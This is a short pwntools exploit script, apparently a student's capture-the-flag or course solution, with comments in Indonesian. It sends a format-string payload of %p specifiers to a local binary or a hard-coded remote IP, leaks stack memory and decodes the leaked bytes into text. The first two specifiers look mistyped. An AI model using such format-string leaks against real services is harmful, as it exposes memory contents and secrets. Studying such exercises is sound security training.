from pwn import *
from pwn import p64

binary = './4'
context.binary = binary

def decode_leaked(leaked):
    # Hapus 'b' dan newline
    leaked = leaked.decode().strip()
    # Split berdasarkan titik
    parts = leaked.split('.')
    
    decoded = ''
    for part in parts:
        # Hapus '0x' dari setiap bagian
        hex_val = part.replace('0x', '')
        # Convert hex ke bytes dan reverse (little endian)
        try:
            bytes_val = bytes.fromhex(hex_val)
            ascii_val = bytes_val[::-1]  # reverse karena little endian
            decoded += ascii_val.decode()
        except:
            continue
            
    return decoded

def conn(): 
    if args.GDB: 
        return gdb.debug(binary,
        gdbscript="""
        break main
        continue
        """)
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(binary)

def solve():
    p = conn()
    
    # Tunggu prompt dan kirim NIM
    p.recvuntil(b"NIM: ")
    p.sendline(b"13523111")
    
    # Tunggu prompt berikutnya dan kirim Challenge number
    p.recvuntil(b"Challenge: ")
    p.sendline(b"4")
    
    # Kirim payload format string untuk leak memory
    payload = b"46%$p.47%$p.%48$p.%49$p.%50$p.%51$p.%52$p.%53$p"
    p.sendline(payload)
    
    # Ambil response
    leaked = p.recvline()
    print("Raw leaked data:", leaked)
    
    # Decode dan print hasilnya
    decoded = decode_leaked(leaked)
    print("\nDecoded message:", decoded)
    
    p.interactive()
    

solve()